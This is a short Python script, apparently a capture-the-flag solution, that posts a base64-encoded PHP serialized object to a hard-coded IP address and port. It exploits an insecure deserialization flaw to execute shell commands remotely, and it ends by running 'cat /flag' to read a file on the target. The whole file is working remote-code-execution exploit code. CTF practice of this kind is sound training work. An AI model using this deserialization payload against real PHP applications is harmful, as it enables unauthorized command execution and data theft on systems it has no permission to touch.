import httpx
from base64 import b64encode


def exec_shell(command: str):
    payload = f'O:5:"mycmd":1:{{s:3:"cmd";s:{len(command)}:"{command}";}}'

    resp = httpx.post('http://129.204.78.34:20518/', data={
        'data': b64encode(payload.encode()).decode()
    })

    resp = resp.text
    split = '</code>'

    print(resp[resp.find(split) + len(split):])


exec_shell('cat /flag')
